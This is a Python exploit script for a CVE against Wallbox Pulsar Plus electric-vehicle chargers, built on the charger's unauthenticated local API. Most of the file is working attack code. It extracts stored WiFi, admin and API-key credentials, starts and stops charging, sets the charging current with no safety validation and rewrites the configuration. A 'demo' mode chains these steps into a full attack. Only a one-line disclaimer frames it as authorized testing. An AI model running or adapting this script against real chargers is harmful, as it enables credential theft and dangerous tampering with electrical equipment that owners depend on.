#!/usr/bin/env python3
"""
CVE-2023-32249 Exploit - Wallbox Pulsar Plus Unauthenticated API

This exploit targets the unencrypted and unauthenticated local API
of Wallbox Pulsar Plus chargers.

Target: Wallbox Pulsar Plus firmware <= 5.5.10
Impact: Unauthorized control of charging, credential theft

Usage:
    python3 cve_2023_32249_wallbox_unauth.py <target_ip> <port>
    python3 cve_2023_32249_wallbox_unauth.py 192.168.1.100 8083

DISCLAIMER: For authorized security testing only.
"""

import argparse
import requests
import json
import sys
import time


class WallboxExploit:
    def __init__(self, target: str, port: int):
        self.base_url = f"http://{target}:{port}"
        
    def check_vulnerable(self) -> bool:
        """Check if target is vulnerable (unauthenticated access)"""
        print(f"[*] Checking target: {self.base_url}")
        try:
            resp = requests.get(f"{self.base_url}/api/status", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('authentication_required') == False:
                    print("[+] Target is VULNERABLE to CVE-2023-32249!")
                    print(f"    Vendor: {data.get('vendor')}")
                    print(f"    Model: {data.get('model')}")
                    print(f"    Firmware: {data.get('firmware')}")
                    return True
            print("[-] Target does not appear vulnerable")
            return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
            return False
    
    def get_status(self) -> dict:
        """Get charger status"""
        try:
            resp = requests.get(f"{self.base_url}/api/status", timeout=10)
            return resp.json()
        except Exception as e:
            print(f"[-] Error: {e}")
            return {}
    
    def start_charging(self) -> bool:
        """Start charging without authentication"""
        print("\n[*] Attempting to start charging (no authentication)...")
        try:
            resp = requests.post(f"{self.base_url}/api/charge/start", timeout=10)
            data = resp.json()
            if data.get('status') == 'charging_started':
                print("[+] SUCCESS! Charging started without authentication!")
                print(f"    Warning: {data.get('warning')}")
                return True
            print(f"[-] Failed: {data}")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def stop_charging(self) -> bool:
        """Stop charging without authentication"""
        print("\n[*] Attempting to stop charging (no authentication)...")
        try:
            resp = requests.post(f"{self.base_url}/api/charge/stop", timeout=10)
            data = resp.json()
            if data.get('status') == 'charging_stopped':
                print("[+] SUCCESS! Charging stopped!")
                print(f"    Energy delivered: {data.get('energy_delivered_kwh')} kWh")
                return True
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def set_current(self, amps: int) -> bool:
        """Set charging current without validation - DANGEROUS"""
        print(f"\n[*] Setting charging current to {amps}A (no safety validation)...")
        try:
            resp = requests.post(
                f"{self.base_url}/api/current/set",
                json={"current": amps},
                timeout=10
            )
            data = resp.json()
            if data.get('status') == 'current_set':
                print(f"[+] SUCCESS! Current set to {data.get('current_amps')}A")
                print(f"    Power: {data.get('power_w')}W")
                print(f"    Warning: {data.get('warning')}")
                return True
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def get_credentials(self) -> dict:
        """Extract stored credentials from config"""
        print("\n[*] Extracting credentials from configuration...")
        try:
            resp = requests.get(f"{self.base_url}/api/config", timeout=10)
            if resp.status_code == 200:
                config = resp.json()
                print("[+] Credentials extracted!")
                print(f"    WiFi SSID: {config.get('wifi_ssid')}")
                print(f"    WiFi Password: {config.get('wifi_password')}")
                print(f"    Admin Password: {config.get('admin_password')}")
                print(f"    API Key: {config.get('api_key')}")
                print(f"    OCPP URL: {config.get('ocpp_url')}")
                print(f"    Encryption Enabled: {config.get('encryption_enabled')}")
                return config
            return {}
        except Exception as e:
            print(f"[-] Error: {e}")
            return {}
    
    def modify_config(self, key: str, value: str) -> bool:
        """Modify charger configuration without authentication"""
        print(f"\n[*] Modifying config: {key} = {value}")
        try:
            resp = requests.post(
                f"{self.base_url}/api/config",
                json={key: value},
                timeout=10
            )
            data = resp.json()
            if data.get('status') == 'config_updated':
                print("[+] Configuration modified!")
                return True
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def demo_attack(self):
        """Demonstrate full attack chain"""
        print("\n" + "="*60)
        print("DEMONSTRATION: Full Attack Chain")
        print("="*60)
        
        # 1. Get status
        print("\n[STEP 1] Reading charger status without authentication...")
        status = self.get_status()
        print(f"    Status: {status.get('status')}")
        print(f"    Charging: {status.get('charging')}")
        print(f"    Current: {status.get('current_amps')}A")
        
        # 2. Extract credentials
        print("\n[STEP 2] Extracting stored credentials...")
        self.get_credentials()
        
        # 3. Start charging
        print("\n[STEP 3] Starting unauthorized charging session...")
        self.start_charging()
        
        time.sleep(2)
        
        # 4. Modify current
        print("\n[STEP 4] Modifying charging current (safety bypass)...")
        self.set_current(32)
        
        time.sleep(2)
        
        # 5. Stop charging
        print("\n[STEP 5] Stopping charging session...")
        self.stop_charging()
        
        print("\n" + "="*60)
        print("ATTACK COMPLETE - All actions performed without authentication")
        print("="*60)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2023-32249 - Wallbox Pulsar Plus Unauthenticated API Exploit"
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("port", type=int, default=8083, nargs='?', help="Target port (default: 8083)")
    parser.add_argument("--start", action="store_true", help="Start charging")
    parser.add_argument("--stop", action="store_true", help="Stop charging")
    parser.add_argument("--current", type=int, help="Set charging current (Amps)")
    parser.add_argument("--creds", action="store_true", help="Extract credentials")
    parser.add_argument("--demo", action="store_true", help="Run full attack demonstration")
    
    args = parser.parse_args()
    
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║  CVE-2023-32249 - Wallbox Pulsar Plus Unauthenticated API ║
    ║  No encryption, no authentication required                 ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    exploit = WallboxExploit(args.target, args.port)
    
    if not exploit.check_vulnerable():
        sys.exit(1)
    
    if args.demo:
        exploit.demo_attack()
    elif args.start:
        exploit.start_charging()
    elif args.stop:
        exploit.stop_charging()
    elif args.current:
        exploit.set_current(args.current)
    elif args.creds:
        exploit.get_credentials()
    else:
        # Default: show status and credentials
        print("\n[*] Current Status:")
        status = exploit.get_status()
        print(json.dumps(status, indent=2))
        exploit.get_credentials()


if __name__ == "__main__":
    main()
